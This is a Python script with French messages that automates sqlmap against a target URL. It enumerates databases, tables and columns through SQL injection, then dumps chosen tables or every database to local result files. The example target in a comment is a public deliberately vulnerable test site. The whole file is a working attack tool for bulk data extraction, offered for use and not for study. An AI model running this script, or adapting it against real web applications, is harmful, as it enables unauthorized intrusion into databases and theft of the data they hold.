import subprocess
import re
import os

def run_sqlmap_dbs(url):
    cmd = ["sqlmap", "-u", url, "--batch", "--dbs"]
    print("Commande exécutée :\n", " ".join(cmd))
    print("=" * 60)
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print(result.stdout)
        print("=" * 60)

        databases = [db for db in re.findall(r"\[\*\] ([a-zA-Z0-9_]+)", result.stdout)
                     if db.lower() not in {"starting", "ending"}]

        # ✅ Créer le dossier s’il n’existe pas
        os.makedirs("results/database", exist_ok=True)

        # ✅ Sauvegarder toutes les bases dans un seul fichier
        with open("results/database/database.txt", "w", encoding="utf-8") as f:
            for db in databases:
                f.write(f"{db}\n")
        print("📁 Bases sauvegardées dans : results/database/database.txt")

        return databases
    except subprocess.CalledProcessError as e:
        print("Erreur SQLMap (dbs) :", e.stdout or e.stderr)
        return []

def run_sqlmap_tables(url, database_name):
    cmd = ["sqlmap", "-u", url, "-D", database_name, "--tables", "--batch"]
    print(f"\nCommande exécutée pour les tables de '{database_name}' :\n", " ".join(cmd))
    print("=" * 60)
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print(result.stdout)
        print("=" * 60)

        tables = [
            line.strip().strip('|').strip()
            for line in result.stdout.splitlines()
            if line.strip().startswith('|') and line.strip().count('|') == 2 and '-' not in line
        ]

        os.makedirs("results/table", exist_ok=True)
        with open(f"results/table/table_{database_name}.txt", "w", encoding="utf-8") as f:
            for table in tables:
                f.write(f"{table}\n")
        print(f"📁 Tables sauvegardées dans : results/table/table_{database_name}.txt")

        return tables
    except subprocess.CalledProcessError as e:
        print(f"Erreur SQLMap (tables) pour '{database_name}' :", e.stdout or e.stderr)
        return []

def run_sqlmap_columns(url, database_name, table_name):
    cmd = ["sqlmap", "-u", url, "-D", database_name, "-T", table_name, "--columns", "--batch"]
    print(f"\n📌 Commande exécutée pour les colonnes de '{database_name}.{table_name}' :\n", " ".join(cmd))
    print("=" * 60)
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print(result.stdout)
        print("=" * 60)

        columns = re.findall(r"\| ([a-zA-Z0-9_]+) \| [a-zA-Z0-9()]+ \|", result.stdout)

        os.makedirs("results/columns", exist_ok=True)
        with open(f"results/columns/columns_{database_name}_{table_name}.txt", "w", encoding="utf-8") as f:
            for column in columns:
                f.write(f"{column}\n")
        print(f"📁 Colonnes sauvegardées dans : results/columns/columns_{database_name}_{table_name}.txt")

        return columns
    except subprocess.CalledProcessError as e:
        print(f"❌ Erreur SQLMap (columns) pour '{database_name}.{table_name}' :")
        print(e.stdout or e.stderr)
        return []

def run_sqlmap_dump_all(url, database_name):
    cmd = ["sqlmap", "-u", url, "-D", database_name, "--dump-all", "--batch"]
    print(f"\n📥 Dump complet de '{database_name}' :\n", " ".join(cmd))
    print("=" * 60)
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print(result.stdout)
        print("=" * 60)

        os.makedirs("results/dump", exist_ok=True)
        with open(f"results/dump/dump_{database_name}_all.txt", "w", encoding="utf-8") as f:
            f.write(result.stdout)
        print(f"📁 Dump sauvegardé dans : results/dump/dump_{database_name}_all.txt")

        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"❌ Erreur SQLMap (dump-all) pour '{database_name}' :")
        print(e.stdout or e.stderr)
        return ""

def run_sqlmap_dump_table(url, database_name, table_name):
    cmd = ["sqlmap", "-u", url, "-D", database_name, "-T", table_name, "--dump", "--batch"]
    print(f"\n📥 Dump de '{database_name}.{table_name}' :\n", " ".join(cmd))
    print("=" * 60)
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print(result.stdout)
        print("=" * 60)

        os.makedirs("results/dump", exist_ok=True)
        with open(f"results/dump/dump_{database_name}_{table_name}.txt", "w", encoding="utf-8") as f:
            f.write(result.stdout)
        print(f"📁 Dump sauvegardé dans : results/dump/dump_{database_name}_{table_name}.txt")
    except subprocess.CalledProcessError as e:
        print(f"❌ Erreur SQLMap (dump) pour '{database_name}.{table_name}' :")
        print(e.stdout or e.stderr)

def sqlmap(url):
    databases = run_sqlmap_dbs(url)
    if not databases:
        print("❌ Aucune base trouvée.")
        return

    print("\n📚 Bases de données disponibles :")
    for i, db in enumerate(databases):
        print(f"[{i}] {db}")
    print("[a] Tout dumper")

    choice = input("\n👉 Choisissez une base (ou 'a' pour tout dumper) : ").strip().lower()

    if choice == "a":
        for db in databases:
            tables = run_sqlmap_tables(url, db)
            if not tables:
                continue
            for tbl in tables:
                run_sqlmap_columns(url, db, tbl)
                run_sqlmap_dump_table(url, db, tbl)
    elif choice.isdigit() and int(choice) < len(databases):
        selected_db = databases[int(choice)]
        tables = run_sqlmap_tables(url, selected_db)
        if not tables:
            print(f"❌ Aucune table trouvée dans '{selected_db}'")
            return

        print(f"\n📄 Tables dans '{selected_db}' :")
        for i, tbl in enumerate(tables):
            print(f"[{i}] {tbl}")
        print("[a] Dumper toutes les tables")

        tbl_choice = input("\n👉 Choisissez une table (ou 'a' pour tout dumper) : ").strip().lower()

        if tbl_choice == "a":
            for tbl in tables:
                run_sqlmap_columns(url, selected_db, tbl)
                run_sqlmap_dump_table(url, selected_db, tbl)
        elif tbl_choice.isdigit() and int(tbl_choice) < len(tables):
            selected_tbl = tables[int(tbl_choice)]
            run_sqlmap_columns(url, selected_db, selected_tbl)
            run_sqlmap_dump_table(url, selected_db, selected_tbl)
        else:
            print("❌ Choix invalide pour les tables.")
    else:
        print("❌ Choix invalide pour la base.")

# Exemple :
# sqlmap("http://testphp.vulnweb.com/artists.php?artist=1")
